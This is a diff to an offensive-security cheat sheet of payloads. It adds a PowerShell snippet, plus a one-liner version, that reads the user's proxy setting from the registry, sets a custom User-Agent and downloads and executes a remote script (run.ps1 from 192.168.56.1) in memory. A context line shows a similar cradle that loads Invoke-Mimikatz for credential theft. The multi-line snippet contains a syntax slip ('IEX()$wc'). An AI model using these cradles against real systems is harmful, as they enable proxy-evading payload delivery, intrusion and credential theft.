@@ -1,4 +1,4 @@
-# ⭕ Other Methods
+# ⭕ Other Payloads
 
 ## Web Shells
 
@@ -92,6 +92,26 @@ Kali JSP Reverse Shell:
 
 ```
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1') ;
+```
+
+### Proxy-aware Load in Memory with User Agent
+
+```
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+$keys = Get-ChildItem 'HKU:\'
+ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start =
+$key.Name.substring(10);break}}
+$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
+$wc = new-object system.net.WebClient
+$wc.Headers.Add('User-Agent', "RELPACE THIS")
+IEX()$wc.DownloadString("http://192.168.56.1/run.ps1")
+```
+
+#### one-liner
+
+```
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = Get-ChildItem 'HKU:\';ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr");$wc = new-object system.net.WebClient;$wc.Headers.Add('User-Agent', "RELPACE THIS");IEX($wc.DownloadString("http://192.168.56.1/run.ps1"))
 ```
 
 ### PowerShell Reverse Shells
